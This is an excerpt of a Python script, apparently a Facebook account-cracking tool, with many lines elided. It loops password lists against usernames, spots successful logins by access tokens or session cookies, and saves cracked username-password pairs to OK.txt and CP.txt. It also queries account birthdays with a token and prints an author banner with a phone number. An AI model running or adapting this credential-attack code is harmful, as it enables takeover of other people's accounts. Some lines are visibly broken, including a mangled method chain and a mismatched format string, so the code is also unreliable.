...
class __crack__:
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-AS] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AS] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AS] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;32m[Successful-AS] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AS] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-AS] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : AKASH SUMON
    Facebook : https://facebook.com/akash.sumon.007
    Team     : FUCK YOU 
    Connect  : 01826842231
 [*]=============================================
